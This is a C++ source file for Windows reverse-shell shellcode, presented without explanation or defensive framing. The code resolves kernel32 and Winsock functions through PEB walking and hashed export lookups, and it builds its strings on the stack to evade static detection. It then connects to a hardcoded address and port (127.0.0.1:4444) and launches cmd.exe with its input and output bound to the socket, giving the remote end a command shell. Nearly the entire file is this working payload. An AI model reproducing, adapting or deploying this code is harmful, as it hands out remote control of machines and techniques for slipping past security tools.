#include <winsock2.h>
#include <stdint.h>
#include <iostream>
#include "native_defs.h"


/* This is probably pointless since
 * MSVC doesn't support inline ASM anyways,
 * meaning we can't compile with it.
 */
#if defined(_MSC_VER)
    #define SHC_FORCEINLINE __forceinline inline
#else
    #define SHC_FORCEINLINE __attribute__((always_inline)) inline
#endif

/* Module hashes */
#define HASH_K32   914211162U
#define HASH_NTDLL 1217983891U

/* Function hashes */
#define HASH_CREATEPROCESSA  3245095175U
#define HASH_LOADLIBRARYA    1066379828U
#define HASH_EXITPROCESS     785185407U
#define HASH_WAITSINGLEOBJ   2422222221U
#define HASH_WSASTARTUP      4061419063U
#define HASH_WSASOCKETA      685702926U
#define HASH_HTONS           3584961272U
#define HASH_INET_ADDR       2417866286U
#define HASH_CONNECT         3063039653U

/* Type aliases */
using HashType         = uint32_t;
using pCreateProcessA  = decltype(&::CreateProcessA);
using pLoadLibraryA    = decltype(&::LoadLibraryA);
using pExitProcess     = decltype(&::ExitProcess);
using pWaitSingleObj   = decltype(&::WaitForSingleObject);
using pInetAddr        = decltype(&::inet_addr);
using pHtons           = decltype(&::htons);
using pWSASocketA      = decltype(&::WSASocketA);
using pWSAStartup      = decltype(&::WSAStartup);
using pConnect         = decltype(&::connect);

/* Function prototypes */
template<typename T>
HashType hash_bytes(void* bytes, uint32_t len);
uint32_t my_strlen(const char* str);
uint8_t* get_module_base(HashType ht);
void*    get_func_addr(uint8_t* mod_base, HashType ht);


asm(
  "__main:                        \n"
  "start:                         \n"
  " push rsi                      \n"
  " mov  rsi, rsp                 \n"
  " and  rsp, 0xFFFFFFFFFFFFFFF0  \n"
  " sub  rsp, 0x20                \n"
  " call rshell_impl              \n"
  " mov  rsp, rsi                 \n"
  " pop  rsi                      \n"
  " ret                           \n"
);

extern "C" int rshell_impl() {  

    /* Stack strings */
    char cmd_str[]     = {'c','m','d','\0'};
    char ws2_str[]     = {'W','s','2','_','3','2','\0'};
    char host_addr[]   = {'1','2','7','.','0','.','0','.','1','\0'};
    
    /* Winsock stuff */
    uint16_t    host_port = 4444;
    WSADATA     wsa_data  = { 0 };
    SOCKET      socket    = { 0 };
    sockaddr_in in        = { 0 };

    /* Structs for CreateProcess */
    STARTUPINFOA        startup   = { 0 };
    PROCESS_INFORMATION proc_info = { 0 };

    /* Function pointers */
    pLoadLibraryA   pload_lib    = nullptr;
    pCreateProcessA pcreate_proc = nullptr;
    pExitProcess    pexit_proc   = nullptr;
    pWaitSingleObj  pwait_obj    = nullptr;
    pWSAStartup     pwsa_startup = nullptr;
    pWSASocketA     pwsa_socketa = nullptr;
    pHtons          phtons       = nullptr;
    pInetAddr       pinet_addr   = nullptr;
    pConnect        pconnect     = nullptr;

    /****************************************************************************************/

    auto* pk32 = get_module_base(HASH_K32);
    if(pk32 == nullptr) {
        return 1;
    }

    pload_lib    = reinterpret_cast<pLoadLibraryA>(get_func_addr(pk32, HASH_LOADLIBRARYA));
    pcreate_proc = reinterpret_cast<pCreateProcessA>(get_func_addr(pk32, HASH_CREATEPROCESSA));
    pexit_proc   = reinterpret_cast<pExitProcess>(get_func_addr(pk32, HASH_EXITPROCESS));
    pwait_obj    = reinterpret_cast<pWaitSingleObj>(get_func_addr(pk32, HASH_WAITSINGLEOBJ));

    if(!pload_lib || !pcreate_proc || !pwait_obj || !pexit_proc) {
        return 1;
    }

    auto* pwinsock2 = reinterpret_cast<uint8_t*>(pload_lib(ws2_str));
    if(pwinsock2 == nullptr) {
        return 1;
    }

    pwsa_startup = reinterpret_cast<pWSAStartup>(get_func_addr(pwinsock2, HASH_WSASTARTUP));
    pwsa_socketa = reinterpret_cast<pWSASocketA>(get_func_addr(pwinsock2, HASH_WSASOCKETA));
    phtons       = reinterpret_cast<pHtons>(get_func_addr(pwinsock2, HASH_HTONS));
    pinet_addr   = reinterpret_cast<pInetAddr>(get_func_addr(pwinsock2, HASH_INET_ADDR));
    pconnect     = reinterpret_cast<pConnect>(get_func_addr(pwinsock2, HASH_CONNECT));

    if(!pwsa_startup || !pwsa_socketa || !phtons || !pinet_addr || !pconnect) {
        return 1;
    }

    /****************************************************************************************/

    if(pwsa_startup(MAKEWORD(2, 2), &wsa_data) != 0) {
        return 1;
    }

    if(socket = pwsa_socketa(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0); !socket) {
        return 1;
    }

    in.sin_family      = AF_INET;
    in.sin_addr.s_addr = pinet_addr(host_addr);
    in.sin_port        = phtons(host_port);

    if(pconnect(socket, reinterpret_cast<const sockaddr*>(&in), sizeof(in)) != 0) {
        return 1;
    }

    startup.cb         = sizeof(startup);
    startup.dwFlags   |= STARTF_USESTDHANDLES;
    startup.hStdInput  = reinterpret_cast<HANDLE>(socket);
    startup.hStdError  = reinterpret_cast<HANDLE>(socket);
    startup.hStdOutput = reinterpret_cast<HANDLE>(socket);

    if(!pcreate_proc(nullptr, cmd_str, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &startup, &proc_info)) {
        return 1;
    }

    pwait_obj(proc_info.hProcess, INFINITE);    
    pexit_proc(0);    
}

SHC_FORCEINLINE uint32_t
my_strlen(const char* str) {
    const char* str2;
    for (str2 = str; *str2; ++str2) {}
    return str2 - str;
}

template<typename T>
SHC_FORCEINLINE HashType hash_bytes(void* bytes, uint32_t len) {
    const auto* str = static_cast<T*>(bytes);
    HashType seed   = 7;
    HashType hash   = 0;
    uint32_t index  = 0;

    if(len == 0) {
        len = my_strlen(static_cast<const char *>(bytes));
    }

    while(index != len) {
        T ch = str[index];
        if(ch >= static_cast<T>('a') && ch <= static_cast<T>('z')) {
            ch -= 0x20;
        }

        hash += ch;
        hash += hash << seed;
        hash ^= hash >> 6;
        ++index;
    }

    hash += hash << 3;
    hash ^= hash >> 11;
    hash += hash << 15;

    return hash;
}

SHC_FORCEINLINE uint8_t*
get_module_base(const HashType ht) {
    PLDR_DATA_TABLE_ENTRY data  = nullptr;
    PLIST_ENTRY head            = nullptr;
    PLIST_ENTRY entry           = nullptr;

    head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    entry = head->Flink;

    for (;head != entry; entry = entry->Flink) {
        data = reinterpret_cast<decltype(data)>(entry);
        if (hash_bytes<wchar_t>(data->BaseDllName.Buffer, data->BaseDllName.Length / sizeof(wchar_t)) == ht) {
            return static_cast<uint8_t*>(data->DllBase);
        }
    }

    return nullptr;
}

SHC_FORCEINLINE void*
get_func_addr(uint8_t* mod_base /* HMODULE */, const HashType ht) {
    const auto* dos_hdr = reinterpret_cast<PIMAGE_DOS_HEADER>(mod_base);
    const auto* nt_hdrs = reinterpret_cast<PIMAGE_NT_HEADERS>(mod_base + dos_hdr->e_lfanew);
    const auto* exp_dir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(mod_base + nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    const auto* addr_names = reinterpret_cast<PDWORD>(mod_base + exp_dir->AddressOfNames);
    const auto* addr_funcs = reinterpret_cast<PDWORD>(mod_base + exp_dir->AddressOfFunctions);
    const auto* addr_ords  = reinterpret_cast<PWORD>(mod_base + exp_dir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp_dir->NumberOfFunctions; i++) {
        auto* func_name = reinterpret_cast<char*>(mod_base + addr_names[i]);
        auto* func_addr = mod_base + addr_funcs[addr_ords[i]];
        if(hash_bytes<char>(func_name, 0) == ht) {
            return func_addr;
        }
    }

    return nullptr;
}